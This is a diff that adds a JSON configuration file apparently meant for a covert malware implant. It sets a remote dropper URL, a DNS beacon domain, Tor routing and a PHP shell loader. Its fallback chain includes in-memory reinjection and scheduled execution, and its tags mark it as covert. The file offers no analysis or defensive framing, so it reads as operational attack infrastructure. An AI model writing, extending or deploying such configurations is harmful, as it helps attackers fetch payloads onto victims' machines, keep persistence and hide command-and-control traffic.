@@ -1,0 +1,45 @@
+{
+
+  "cdn_loader_url": "https://cdn.mirrored-net.site/dropper.php",
+
+  "dns_beacon_domain": "beacon.alien-grid.net",
+
+  "fallback_order": [
+
+    "cdn",
+
+    "dns",
+
+    "memory_reinject",
+
+    "scheduled_exec"
+
+  ],
+
+  "encryption_key_rotation_interval": 300,
+
+  "tor_enabled": true,
+
+  "tor_entry_nodes": [
+
+    "guard1.tor.net",
+
+    "guard2.tor.net"
+
+  ],
+
+  "preferred_shellloader": "php_loader.php",
+
+  "enable_dynamic_routing": true,
+
+  "tags": {
+
+    "relay": true,
+
+    "aggressive": false,
+
+    "covert_only": true
+
+  }
+
+}
